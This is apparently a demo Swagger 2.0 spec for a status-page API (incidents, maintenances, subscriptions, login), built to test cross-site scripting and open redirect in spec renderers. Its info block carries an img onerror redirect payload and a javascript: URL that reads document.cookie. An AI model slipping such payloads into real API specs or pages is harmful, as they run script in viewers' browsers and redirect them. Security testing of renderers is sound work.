@@ -1,0 +1,1875 @@
+{
+  "swagger": "2.0",
+  "info": {
+  "title": "XSS Open Redirect Swagger demo",
+  "description": "Description <img onerror=window.location.replace('https://google.com'); src=1> / apres tag img. Lien : <a href='https://www.google.com'>Lien Google</a>",
+  "termsOfService": "javascript:alert(document.cookie)",
+  "version": "1.0.1"
+},
+  "basePath": "/v1",
+  "schemes": [
+    "https",
+    "https"
+  ],
+  "consumes": [
+    "application/json"
+  ],
+  "produces": [
+    "application/json"
+  ],
+  "paths": {
+    "/localizations": {
+      "x-swagger-router-controller": "localization",
+      "x-sequelize-model": "Localization",
+      "get": {
+        "tags": [
+          "translation"
+        ],
+        "description": "Returns object of localized text",
+        "operationId": "getLocalizations",
+        "parameters": [
+          {
+            "name": "locale",
+            "in": "query",
+            "type": "string",
+            "required": false,
+            "description": "Two-letter language code ISO 639-1 code.\nIf objects in response have any associated Localizations, the objects\nwill also return fields with localized text.\nDepending on internal configuration, a default may be set.\n"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Success",
+            "schema": {
+              "type": "array",
+              "items": {
+                "type": "object",
+                "required": [
+                  "modelName",
+                  "modelKey",
+                  "modelAttribute"
+                ],
+                "properties": {
+                  "id": {
+                    "type": "integer"
+                  },
+                  "modelName": {
+                    "type": "string",
+                    "maxLength": 255
+                  },
+                  "modelKey": {
+                    "type": "string",
+                    "maxLength": 255
+                  },
+                  "modelAttribute": {
+                    "type": "string",
+                    "maxLength": 255
+                  },
+                  "LocalizedTexts": {
+                    "type": "array",
+                    "items": {
+                      "type": "object",
+                      "properties": {
+                        "id": {
+                          "type": "integer"
+                        },
+                        "text": {
+                          "type": "string"
+                        },
+                        "code": {
+                          "type": "string",
+                          "maxLength": 10
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/incidents": {
+      "x-swagger-router-controller": "incident",
+      "x-sequelize-model": "Incident",
+      "get": {
+        "tags": [
+          "incidents"
+        ],
+        "description": "Returns an array of Incident objects. Defaults to last 30 days.",
+        "operationId": "getIncidents",
+        "parameters": [
+          {
+            "name": "startTime",
+            "in": "query",
+            "description": "Start time for Incidents to return (ISO 8601)",
+            "required": false,
+            "type": "string",
+            "format": "date"
+          },
+          {
+            "name": "service",
+            "in": "query",
+            "description": "Filter by impacted Services (case insensitive)",
+            "required": false,
+            "type": "string"
+          },
+          {
+            "name": "instance",
+            "in": "query",
+            "description": "Filter by impacted Instances (case insensitive)",
+            "required": false,
+            "type": "string"
+          },
+          {
+            "name": "limit",
+            "in": "query",
+            "description": "Limit for pagination",
+            "required": false,
+            "type": "number",
+            "default": 10000,
+            "maximum": 10000
+          },
+          {
+            "name": "offset",
+            "in": "query",
+            "description": "Offset for pagination",
+            "required": false,
+            "type": "number",
+            "default": 0
+          },
+          {
+            "name": "sort",
+            "in": "query",
+            "type": "string",
+            "description": "Sort by property",
+            "required": false
+          },
+          {
+            "name": "order",
+            "in": "query",
+            "type": "string",
+            "description": "Ordering of property",
+            "required": false
+          },
+          {
+            "name": "locale",
+            "in": "query",
+            "type": "string",
+            "required": false,
+            "description": "Two-letter language code ISO 639-1 code.\nIf objects in response have any associated Localizations, the objects\nwill also return fields with localized text.\nDepending on internal configuration, a default may be set.\n"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Success",
+            "schema": {
+              "type": "array",
+              "items": {
+                "type": "object",
+                "required": [
+                  "id"
+                ],
+                "properties": {
+                  "id": {
+                    "type": "integer"
+                  },
+                  "message": {
+                    "type": [
+                      "object",
+                      "null"
+                    ]
+                  },
+                  "externalId": {
+                    "type": [
+                      "string",
+                      "null"
+                    ]
+                  },
+                  "affectsAll": {
+                    "type": "boolean"
+                  },
+                  "isCore": {
+                    "type": "boolean"
+                  },
+                  "additionalInformation": {
+                    "type": [
+                      "string",
+                      "null"
+                    ]
+                  },
+                  "serviceKeys": {
+                    "type": "array",
+                    "items": {
+                      "type": "string"
+                    }
+                  },
+                  "instanceKeys": {
+                    "type": "array",
+                    "items": {
+                      "type": "string"
+                    }
+                  },
+                  "IncidentImpacts": {
+                    "type": "array",
+                    "items": {
+                      "type": "object",
+                      "required": [
+                        "startTime",
+                        "type"
+                      ],
+                      "properties": {
+                        "id": {
+                          "type": "integer"
+                        },
+                        "startTime": {
+                          "type": "string"
+                        },
+                        "endTime": {
+                          "type": [
+                            "string",
+                            "null"
+                          ]
+                        },
+                        "serviceIssue": {
+                          "type": "string"
+                        },
+                        "endUserImpact": {
+                          "type": "string"
+                        },
+                        "type": {
+                          "type": "string"
+                        },
+                        "createdAt": {
+                          "type": "string"
+                        },
+                        "updatedAt": {
+                          "type": "string"
+                        }
+                      }
+                    }
+                  },
+                  "IncidentEvents": {
+                    "type": "array",
+                    "items": {
+                      "type": "object",
+                      "required": [
+                        "type"
+                      ],
+                      "properties": {
+                        "id": {
+                          "type": "integer"
+                        },
+                        "type": {
+                          "type": "string"
+                        },
+                        "message": {
+                          "type": "string"
+                        },
+                        "createdAt": {
+                          "type": "string"
+                        },
+                        "updatedAt": {
+                          "type": "string"
+                        }
+                      }
+                    }
+                  },
+                  "createdAt": {
+                    "type": "string"
+                  },
+                  "updatedAt": {
+                    "type": "string"
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/incidents/{id}": {
+      "x-swagger-router-controller": "incident",
+      "x-sequelize-model": "Incident",
+      "get": {
+        "tags": [
+          "incidents"
+        ],
+        "description": "Returns an Incident based on Id.",
+        "operationId": "getIncidentById",
+        "parameters": [
+          {
+            "name": "id",
+            "in": "path",
+            "type": "string",
+            "description": "Incident id",
+            "required": true
+          },
+          {
+            "name": "locale",
+            "in": "query",
+            "description": "Two-letter language code (ISO 639-1) ",
+            "required": false,
+            "type": "string"
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Success",
+            "schema": {
+              "type": "object",
+              "required": [
+                "id"
+              ],
+              "properties": {
+                "id": {
+                  "type": "integer"
+                },
+                "message": {
+                  "type": [
+                    "object",
+                    "null"
+                  ]
+                },
+                "externalId": {
+                  "type": [
+                    "string",
+                    "null"
+                  ]
+                },
+                "affectsAll": {
+                  "type": "boolean"
+                },
+                "isCore": {
+                  "type": "boolean"
+                },
+                "additionalInformation": {
+                  "type": [
+                    "string",
+                    "null"
+                  ]
+                },
+                "serviceKeys": {
+                  "type": "array",
+                  "items": {
+                    "type": "string"
+                  }
+                },
+                "instanceKeys": {
+                  "type": "array",
+                  "items": {
+                    "type": "string"
+                  }
+                },
+                "IncidentImpacts": {
+                  "type": "array",
+                  "items": {
+                    "type": "object",
+                    "required": [
+                      "startTime",
+                      "type"
+                    ],
+                    "properties": {
+                      "id": {
+                        "type": "integer"
+                      },
+                      "startTime": {
+                        "type": "string"
+                      },
+                      "endTime": {
+                        "type": [
+                          "string",
+                          "null"
+                        ]
+                      },
+                      "serviceIssue": {
+                        "type": "string"
+                      },
+                      "endUserImpact": {
+                        "type": "string"
+                      },
+                      "type": {
+                        "type": "string"
+                      },
+                      "createdAt": {
+                        "type": "string"
+                      },
+                      "updatedAt": {
+                        "type": "string"
+                      }
+                    }
+                  }
+                },
+                "IncidentEvents": {
+                  "type": "array",
+                  "items": {
+                    "type": "object",
+                    "required": [
+                      "type"
+                    ],
+                    "properties": {
+                      "id": {
+                        "type": "integer"
+                      },
+                      "type": {
+                        "type": "string"
+                      },
+                      "message": {
+                        "type": "string"
+                      },
+                      "createdAt": {
+                        "type": "string"
+                      },
+                      "updatedAt": {
+                        "type": "string"
+                      }
+                    }
+                  }
+                },
+                "createdAt": {
+                  "type": "string"
+                },
+                "updatedAt": {
+                  "type": "string"
+                }
+              }
+            }
+          },
+          "404": {
+            "description": "Incident not found",
+            "schema": {
+              "type": "object",
+              "properties": {
+                "message": {
+                  "type": "string"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/login": {
+      "x-swagger-router-controller": "login",
+      "x-sequelize-model": "Subscriber",
+      "post": {
+        "operationId": "login",
+        "tags": [
+          "subscribe"
+        ],
+        "description": "Requests to send a login link to the email address",
+        "parameters": [
+          {
+            "name": "X-Send-Notification",
+            "in": "header",
+            "description": "Notify subscribers about event.\nAutomatically set using\n",
+            "type": "string",
+            "required": false,
+            "default": "send"
+          },
+          {
+            "name": "body",
+            "in": "body",
+            "description": "Login BOdy",
+            "required": true,
+            "schema": {
+              "type": "object",
+              "properties": {
+                "emailAddress": {
+                  "type": "string",
+                  "description": "Email Address to Send Link to"
+                }
+              }
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Login Action",
+            "schema": {
+              "type": "object",
+              "properties": {
+                "emailAddress": {
+                  "type": "string",
+                  "description": "Email Address to Send Link to"
+                }
+              }
+            }
+          },
+          "default": {
+            "description": "Unexpected error",
+            "schema": {
+              "type": "object",
+              "properties": {
+                "message": {
+                  "type": "string"
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "/swagger": {
+      "x-swagger-pipe": "swagger_raw"
+    }
+  },
+  "definitions": {
+    "Incident": {
+      "type": "object",
+      "required": [
+        "id"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "message": {
+          "type": [
+            "object",
+            "null"
+          ]
+        },
+        "externalId": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "affectsAll": {
+          "type": "boolean"
+        },
+        "isCore": {
+          "type": "boolean"
+        },
+        "additionalInformation": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "serviceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "instanceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "IncidentImpacts": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "startTime",
+              "type"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "startTime": {
+                "type": "string"
+              },
+              "endTime": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "serviceIssue": {
+                "type": "string"
+              },
+              "endUserImpact": {
+                "type": "string"
+              },
+              "type": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "IncidentEvents": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "type"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "type": {
+                "type": "string"
+              },
+              "message": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "IncidentPost": {
+      "type": "object",
+      "required": [
+        "IncidentImpacts"
+      ],
+      "properties": {
+        "message": {
+          "type": [
+            "object",
+            "null"
+          ]
+        },
+        "affectsAll": {
+          "type": "boolean"
+        },
+        "additionalInformation": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "serviceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "instanceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "IncidentImpacts": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "startTime",
+              "type"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "startTime": {
+                "type": "string"
+              },
+              "endTime": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "serviceIssue": {
+                "type": "string"
+              },
+              "endUserImpact": {
+                "type": "string"
+              },
+              "type": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "IncidentEvents": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "type"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "type": {
+                "type": "string"
+              },
+              "message": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        }
+      }
+    },
+    "IncidentPatch": {
+      "type": "object",
+      "properties": {
+        "message": {
+          "type": [
+            "object",
+            "null"
+          ]
+        },
+        "affectsAll": {
+          "type": "boolean"
+        },
+        "additionalInformation": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "serviceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "instanceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "IncidentImpacts": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "startTime",
+              "type"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "startTime": {
+                "type": "string"
+              },
+              "endTime": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "serviceIssue": {
+                "type": "string"
+              },
+              "endUserImpact": {
+                "type": "string"
+              },
+              "type": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "IncidentEvents": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "type"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "type": {
+                "type": "string"
+              },
+              "message": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        }
+      }
+    },
+    "IncidentImpact": {
+      "type": "object",
+      "required": [
+        "startTime",
+        "type"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "startTime": {
+          "type": "string"
+        },
+        "endTime": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "serviceIssue": {
+          "type": "string"
+        },
+        "endUserImpact": {
+          "type": "string"
+        },
+        "type": {
+          "type": "string"
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "IncidentImpactType": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string"
+        },
+        "severity": {
+          "type": "string"
+        }
+      }
+    },
+    "IncidentEvent": {
+      "type": "object",
+      "required": [
+        "type"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "type": {
+          "type": "string"
+        },
+        "message": {
+          "type": "string"
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "IncidentEventType": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string"
+        }
+      }
+    },
+    "Maintenance": {
+      "type": "object",
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "message": {
+          "type": [
+            "object",
+            "null"
+          ]
+        },
+        "externalId": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "name": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "affectsAll": {
+          "type": "boolean"
+        },
+        "isCore": {
+          "type": "boolean"
+        },
+        "plannedStartTime": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "plannedEndTime": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "additionalInformation": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "serviceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "instanceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        },
+        "MaintenanceImpacts": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "startTime": {
+                "type": "string"
+              },
+              "endTime": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "type": {
+                "type": "string"
+              },
+              "systemAvailability": {
+                "type": "string"
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "MaintenanceImpact": {
+      "type": "object",
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "startTime": {
+          "type": "string"
+        },
+        "endTime": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "type": {
+          "type": "string"
+        },
+        "systemAvailability": {
+          "type": "string"
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "MaintenanceImpactType": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string"
+        },
+        "severity": {
+          "type": "string"
+        }
+      }
+    },
+    "MaintenanceEvent": {
+      "type": "object",
+      "required": [
+        "type"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "type": {
+          "type": "string"
+        },
+        "message": {
+          "type": "string"
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "MaintenanceEventType": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string"
+        }
+      }
+    },
+    "GeneralMessage": {
+      "type": "object",
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "subject": {
+          "type": "string"
+        },
+        "body": {
+          "type": "string"
+        },
+        "startDate": {
+          "type": "string"
+        },
+        "endDate": {
+          "type": [
+            "string",
+            "null"
+          ]
+        }
+      }
+    },
+    "MetricValue": {
+      "type": "object",
+      "properties": {
+        "metricValueName": {
+          "type": "string"
+        },
+        "value": {
+          "type": "number",
+          "format": "double"
+        },
+        "timestamp": {
+          "type": "string"
+        },
+        "instanceKey": {
+          "type": "string"
+        }
+      }
+    },
+    "Field": {
+      "type": "object",
+      "required": [
+        "attribute"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "attribute": {
+          "type": "string"
+        },
+        "FieldOptions": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "key": {
+                "type": "string"
+              },
+              "visible": {
+                "type": "boolean",
+                "default": true
+              }
+            }
+          }
+        }
+      }
+    },
+    "FieldOption": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string"
+        },
+        "visible": {
+          "type": "boolean",
+          "default": true
+        }
+      }
+    },
+    "Service": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string",
+          "maxLength": 4098
+        },
+        "order": {
+          "type": [
+            "integer",
+            "null"
+          ],
+          "description": "Order Displayed on the status Timeline."
+        },
+        "isCore": {
+          "type": "boolean",
+          "description": "Sets if service is a \"core service\" or not."
+        }
+      }
+    },
+    "Instance": {
+      "type": "object",
+      "required": [
+        "key"
+      ],
+      "properties": {
+        "key": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "location": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "environment": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "releaseVersion": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "releaseNumber": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "isActive": {
+          "type": "boolean"
+        },
+        "serviceKeys": {
+          "type": "array",
+          "items": {
+            "type": "string"
+          }
+        }
+      }
+    },
+    "InstanceStatus": {
+      "type": "object",
+      "required": [
+        "key"
+      ],
+      "properties": {
+        "key": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "location": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "environment": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "releaseVersion": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "releaseNumber": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "status": {
+          "type": "string",
+          "description": "A top level status of the instance. If multiple events are ongoing, then provides the most severe.",
+          "maxLength": 255,
+          "enum": [
+            "OK",
+            "MAJOR_INCIDENT_CORE",
+            "MINOR_INCIDENT_CORE",
+            "MAINTENANCE_CORE",
+            "INFORMATIONAL_CORE",
+            "MAJOR_INCIDENT_NONCORE",
+            "MINOR_INCIDENT_NONCORE",
+            "MAINTENANCE_NONCORE",
+            "INFORMATIONAL_NONCORE"
+          ]
+        },
+        "Incidents": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "required": [
+              "id"
+            ],
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "message": {
+                "type": [
+                  "object",
+                  "null"
+                ]
+              },
+              "externalId": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "affectsAll": {
+                "type": "boolean"
+              },
+              "isCore": {
+                "type": "boolean"
+              },
+              "additionalInformation": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "serviceKeys": {
+                "type": "array",
+                "items": {
+                  "type": "string"
+                }
+              },
+              "instanceKeys": {
+                "type": "array",
+                "items": {
+                  "type": "string"
+                }
+              },
+              "IncidentImpacts": {
+                "type": "array",
+                "items": {
+                  "type": "object",
+                  "required": [
+                    "startTime",
+                    "type"
+                  ],
+                  "properties": {
+                    "id": {
+                      "type": "integer"
+                    },
+                    "startTime": {
+                      "type": "string"
+                    },
+                    "endTime": {
+                      "type": [
+                        "string",
+                        "null"
+                      ]
+                    },
+                    "serviceIssue": {
+                      "type": "string"
+                    },
+                    "endUserImpact": {
+                      "type": "string"
+                    },
+                    "type": {
+                      "type": "string"
+                    },
+                    "createdAt": {
+                      "type": "string"
+                    },
+                    "updatedAt": {
+                      "type": "string"
+                    }
+                  }
+                }
+              },
+              "IncidentEvents": {
+                "type": "array",
+                "items": {
+                  "type": "object",
+                  "required": [
+                    "type"
+                  ],
+                  "properties": {
+                    "id": {
+                      "type": "integer"
+                    },
+                    "type": {
+                      "type": "string"
+                    },
+                    "message": {
+                      "type": "string"
+                    },
+                    "createdAt": {
+                      "type": "string"
+                    },
+                    "updatedAt": {
+                      "type": "string"
+                    }
+                  }
+                }
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "Maintenances": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "message": {
+                "type": [
+                  "object",
+                  "null"
+                ]
+              },
+              "externalId": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "name": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "affectsAll": {
+                "type": "boolean"
+              },
+              "isCore": {
+                "type": "boolean"
+              },
+              "plannedStartTime": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "plannedEndTime": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "additionalInformation": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              },
+              "serviceKeys": {
+                "type": "array",
+                "items": {
+                  "type": "string"
+                }
+              },
+              "instanceKeys": {
+                "type": "array",
+                "items": {
+                  "type": "string"
+                }
+              },
+              "MaintenanceImpacts": {
+                "type": "array",
+                "items": {
+                  "type": "object",
+                  "properties": {
+                    "id": {
+                      "type": "integer"
+                    },
+                    "startTime": {
+                      "type": "string"
+                    },
+                    "endTime": {
+                      "type": [
+                        "string",
+                        "null"
+                      ]
+                    },
+                    "type": {
+                      "type": "string"
+                    },
+                    "systemAvailability": {
+                      "type": "string"
+                    },
+                    "createdAt": {
+                      "type": "string"
+                    },
+                    "updatedAt": {
+                      "type": "string"
+                    }
+                  }
+                }
+              },
+              "createdAt": {
+                "type": "string"
+              },
+              "updatedAt": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        "GeneralMessages": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "subject": {
+                "type": "string"
+              },
+              "body": {
+                "type": "string"
+              },
+              "startDate": {
+                "type": "string"
+              },
+              "endDate": {
+                "type": [
+                  "string",
+                  "null"
+                ]
+              }
+            }
+          }
+        }
+      }
+    },
+    "InstanceAlias": {
+      "type": "object",
+      "properties": {
+        "key": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "instanceKey": {
+          "type": "string",
+          "maxLength": 255
+        }
+      }
+    },
+    "Locale": {
+      "type": "object",
+      "required": [
+        "name",
+        "code"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "name": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "code": {
+          "type": "string",
+          "maxLength": 255
+        }
+      }
+    },
+    "Localization": {
+      "type": "object",
+      "required": [
+        "modelName",
+        "modelKey",
+        "modelAttribute"
+      ],
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "modelName": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "modelKey": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "modelAttribute": {
+          "type": "string",
+          "maxLength": 255
+        },
+        "LocalizedTexts": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "id": {
+                "type": "integer"
+              },
+              "text": {
+                "type": "string"
+              },
+              "code": {
+                "type": "string",
+                "maxLength": 10
+              }
+            }
+          }
+        }
+      }
+    },
+    "SubscribeAction": {
+      "type": "object",
+      "properties": {
+        "emailAddress": {
+          "type": "string",
+          "description": "Email address of subscriber"
+        },
+        "locale": {
+          "type": "string",
+          "description": "Locale for alerts",
+          "default": "en"
+        },
+        "subscriptions": {
+          "type": "object",
+          "properties": {
+            "all": {
+              "type": "boolean"
+            },
+            "instances": {
+              "type": "object",
+              "additionalProperties": {
+                "type": "object",
+                "properties": {
+                  "all": {
+                    "type": "boolean"
+                  },
+                  "services": {
+                    "type": "object",
+                    "additionalProperties": {
+                      "type": "object",
+                      "properties": {
+                        "severities": {
+                          "type": "object",
+                          "properties": {
+                            "major": {
+                              "type": "boolean"
+                            },
+                            "minor": {
+                              "type": "boolean"
+                            },
+                            "maintenances": {
+                              "type": "boolean"
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "Subscriber": {
+      "type": "object",
+      "properties": {
+        "emailAddress": {
+          "type": "string",
+          "description": "Email address of subscriber"
+        },
+        "locale": {
+          "type": "string",
+          "description": "Locale for alerts"
+        },
+        "subscription": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "all": {
+                "type": "boolean"
+              },
+              "instances": {
+                "type": "object",
+                "additionalProperties": {
+                  "type": "object",
+                  "properties": {
+                    "all": {
+                      "type": "boolean"
+                    },
+                    "services": {
+                      "type": "object",
+                      "additionalProperties": {
+                        "type": "object",
+                        "properties": {
+                          "severities": {
+                            "type": "object",
+                            "properties": {
+                              "major": {
+                                "type": "boolean"
+                              },
+                              "minor": {
+                                "type": "boolean"
+                              },
+                              "maintenances": {
+                                "type": "boolean"
+                              }
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          },
+          "description": "List of Subscriptions"
+        },
+        "isActive": {
+          "type": "boolean",
+          "description": "Subscriber Status"
+        },
+        "createdAt": {
+          "type": "string"
+        },
+        "updatedAt": {
+          "type": "string"
+        }
+      }
+    },
+    "Subscription": {
+      "type": "object",
+      "properties": {
+        "all": {
+          "type": "boolean"
+        },
+        "instances": {
+          "type": "object",
+          "additionalProperties": {
+            "type": "object",
+            "properties": {
+              "all": {
+                "type": "boolean"
+              },
+              "services": {
+                "type": "object",
+                "additionalProperties": {
+                  "type": "object",
+                  "properties": {
+                    "severities": {
+                      "type": "object",
+                      "properties": {
+                        "major": {
+                          "type": "boolean"
+                        },
+                        "minor": {
+                          "type": "boolean"
+                        },
+                        "maintenances": {
+                          "type": "boolean"
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "InstanceSubscription": {
+      "type": "object",
+      "properties": {
+        "all": {
+          "type": "boolean"
+        },
+        "services": {
+          "type": "object",
+          "additionalProperties": {
+            "type": "object",
+            "properties": {
+              "severities": {
+                "type": "object",
+                "properties": {
+                  "major": {
+                    "type": "boolean"
+                  },
+                  "minor": {
+                    "type": "boolean"
+                  },
+                  "maintenances": {
+                    "type": "boolean"
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    },
+    "ServiceSubscription": {
+      "type": "object",
+      "properties": {
+        "severities": {
+          "type": "object",
+          "properties": {
+            "major": {
+              "type": "boolean"
+            },
+            "minor": {
+              "type": "boolean"
+            },
+            "maintenances": {
+              "type": "boolean"
+            }
+          }
+        }
+      }
+    },
+    "UnsubscribeAction": {
+      "type": "object",
+      "properties": {
+        "token": {
+          "type": "string",
+          "description": "Unsubscribe JWT Token"
+        }
+      }
+    },
+    "LoginAction": {
+      "type": "object",
+      "properties": {
+        "emailAddress": {
+          "type": "string",
+          "description": "Email Address to Send Link to"
+        }
+      }
+    },
+    "Product": {
+      "type": "object",
+      "properties": {
+        "id": {
+          "type": "integer"
+        },
+        "name": {
+          "type": "string"
+        },
+        "parentId": {
+          "type": "integer"
+        },
+        "parentName": {
+          "type": "string"
+        },
+        "order": {
+          "type": "integer"
+        },
+        "path": {
+          "type": "string"
+        },
+        "public": {
+          "type": "boolean",
+          "default": true
+        }
+      }
+    },
+    "NotFoundError": {
+      "type": "object",
+      "properties": {
+        "message": {
+          "type": "string"
+        }
+      }
+    },
+    "Error": {
+      "type": "object",
+      "properties": {
+        "message": {
+          "type": "string"
+        }
+      }
+    }
+  },
+  "parameters": {
+    "localeParams": {
+      "name": "locale",
+      "in": "query",
+      "type": "string",
+      "required": false,
+      "description": "Two-letter language code ISO 639-1 code.\nIf objects in response have any associated Localizations, the objects\nwill also return fields with localized text.\nDepending on internal configuration, a default may be set.\n"
+    }
+  }
+}
